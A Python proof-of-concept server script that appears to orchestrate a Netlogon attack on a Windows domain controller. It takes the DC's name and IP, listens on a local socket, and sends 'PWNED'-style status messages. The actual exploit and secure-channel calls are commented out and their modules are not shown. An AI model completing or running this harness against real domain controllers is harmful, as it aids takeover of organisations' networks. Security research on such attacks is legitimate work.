#!/usr/bin/python3
import os, select, exploit, netlogon_client, sys, socket
from time import sleep
from userlog import userlog

def recvall(clientsocket):
   text = ""
   while True:
      data = clientsocket.recv(4096)
      if (data):
         text = data.decode("utf-8")
      if (text == ""):
         raise Exception("Disconnected")
      else:
         return text

def communicate(clientsocket, addr, user):
      try:
         print("Waiting message : \n")
         text = recvall(clientsocket)
         if (text != ""):
            print("received : "+ text)
         if (text == "CONNECTEDx"):
            try:
               msg = "RUNPWNxxxx"
               clientsocket.send(msg.encode('ascii'))

               print("\nRunning Exploit\n")
               ##exploit.perform_attack(user.dc_name, user.ip, user.computer_name)
               msg = "PWNEDxxxxx"
               clientsocket.send(msg.encode('ascii'))

               print("\nInitiate Secure Channel...\n")
               ##netlogon_client.InitiateSecureChannel(user)
               msg = "ENDxxxxxxx"
               clientsocket.send(msg.encode('ascii'))

               print("Client disconnected")
            except:
               print("Exploit Failed")
               msg = "FAILURExxx"
               clientsocket.send(msg.encode('ascii'))
         else:
            print("ERROR FIRST CONNECTION")
      except:
         print("Client disconnected")

def createServer(user):
   serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   (host, port) = ("localhost", 9996)
   serversocket.bind((host, port))
   serversocket.listen(5)
   while True:
      clientsocket,addr = serversocket.accept()
      print(str(addr) + " -- Is now connected")
      communicate(clientsocket, addr, user)
      clientsocket.close()

def main():
   if (len(sys.argv) != 4):
      print('Usage: serverPOC.py <dc-name> <account_name> <dc-ip>\n')
      print('Note: dc-name should be the (NetBIOS) computer name  \
                of the domain controller.')
      sys.exit(1)
   else:
      print("\n\n         __Starting ServerPOC__")
      [_, dc_name, account_name, dc_ip] = sys.argv
      computer_name = socket.gethostname()
      dc_name = "\\\\" + dc_name
      print("DC Name : ", dc_name)
      print("DC IP : ", dc_ip)
      print("Computer Name : ", computer_name)
      print("Account Name : ", account_name)
      user = userlog(
         dc_name,
         computer_name,
         account_name,
         None,
         dc_ip)
      createServer(user)

if __name__ == "__main__":
   main()